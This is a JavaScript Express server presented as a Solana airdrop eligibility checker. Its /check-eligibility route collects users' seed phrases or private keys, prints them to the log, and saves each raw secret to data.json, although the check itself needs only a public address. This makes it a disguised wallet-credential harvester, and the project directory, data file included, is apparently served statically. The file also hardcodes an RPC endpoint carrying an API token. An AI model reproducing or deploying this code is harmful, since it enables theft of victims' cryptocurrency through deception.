const { Connection, PublicKey, Keypair } = require('@solana/web3.js');
const bip39 = require('bip39');
const ed25519 = require('ed25519-hd-key');
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const bs58 = require('bs58'); // Correct import

const app = express();
const PORT = 3000;

app.use(express.static(path.join(__dirname, 'public')));

// ===========================
// Solana Mainnet Connection
// ===========================
const connection = new Connection(
  "https://compatible-skilled-morning.solana-mainnet.quiknode.pro/c3cfd2fa77d4e3b9e19505472b33fde45bd276eb/",
  "confirmed"
);

app.use(bodyParser.json());
app.use(express.static(__dirname));

// ===========================
// Helper to fetch total transactions
// ===========================
async function getTotalTransactions(walletAddress) {
  try {
    const pubKey = new PublicKey(walletAddress);
    let allSignatures = [];
    let before = undefined;

    while (true) {
      const signatures = await connection.getSignaturesForAddress(pubKey, { limit: 1000, before });
      if (signatures.length === 0) break;
      allSignatures = allSignatures.concat(signatures);
      before = signatures[signatures.length - 1].signature;
    }

    return allSignatures.length;
  } catch (err) {
    console.error("Error fetching transactions:", err);
    return 0;
  }
}

// ===========================
// Route to check eligibility
// ===========================
app.post('/check-eligibility', async (req, res) => {
  const { seed } = req.body;

  if (!seed) {
    return res.status(400).json({ success: false, message: 'Seed phrase or private key is required' });
  }

  try {
    let publicKey;

    // If it's a seed phrase (mnemonic)
    if (bip39.validateMnemonic(seed.trim())) {
      const seedBuffer = await bip39.mnemonicToSeed(seed);
      const derived = ed25519.derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
      const keypair = Keypair.fromSeed(derived.key);
      publicKey = keypair.publicKey.toBase58();

    } else {
      // Handle Base58 Private Key
      try {
        console.log("Raw private key input:", seed.trim());

        const privateKeyBytes = bs58.decode(seed.trim());
        console.log("Decoded private key length:", privateKeyBytes.length);

        if (privateKeyBytes.length !== 64 && privateKeyBytes.length !== 32) {
          return res.status(400).json({
            success: false,
            message: `Invalid private key length (${privateKeyBytes.length} bytes, must be 32 or 64 bytes)`
          });
        }

        const keypair = Keypair.fromSecretKey(privateKeyBytes);
        publicKey = keypair.publicKey.toBase58();

        console.log("Derived public key:", publicKey);
      } catch (pkError) {
        console.error("Private key error:", pkError);
        return res.status(400).json({ success: false, message: 'Invalid seed phrase or private key' });
      }
    }

    console.log('Checking wallet on-chain:', publicKey);

    // Fetch total transactions
    const totalTx = await getTotalTransactions(publicKey);
    console.log(`Total transactions: ${totalTx}`);

    // Calculate total eligible transactions
    const totalEligibleTx = Math.floor(totalTx / 6);

    // Determine eligibility and tier
    let eligible = totalEligibleTx > 100;
    let tier = null;

    if (eligible) {
      if (totalEligibleTx >= 101 && totalEligibleTx <= 250) tier = 1;
      else if (totalEligibleTx >= 251 && totalEligibleTx <= 400) tier = 2;
      else if (totalEligibleTx >= 401 && totalEligibleTx <= 550) tier = 3;
      else if (totalEligibleTx >= 551 && totalEligibleTx <= 700) tier = 4;
      else if (totalEligibleTx >= 701 && totalEligibleTx <= 850) tier = 5;
      else if (totalEligibleTx >= 851) tier = 6;
    }

    // Save results to data.json
    const filePath = path.join(__dirname, 'data.json');
    fs.readFile(filePath, 'utf8', (err, data) => {
      let jsonData = [];
      if (!err && data) {
        try {
          jsonData = JSON.parse(data);
        } catch (parseError) {
          console.error('Failed to parse existing data.json:', parseError);
        }
      }

      jsonData.push({
        seed,
        wallet: publicKey,
        totalTx,
        totalEligibleTx,
        eligible,
        tier,
        timestamp: new Date().toISOString()
      });

      fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
        if (err) {
          return res.status(500).json({ success: false, message: 'Failed to save data' });
        }

        res.json({
          success: true,
          totalTx,
          totalEligibleTx,
          eligible,
          tier
        });
      });
    });

  } catch (error) {
    console.error('Eligibility check error:', error);
    res.status(500).json({ success: false, message: 'Error checking eligibility' });
  }
});

// ===========================
// Start the server
// ===========================
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
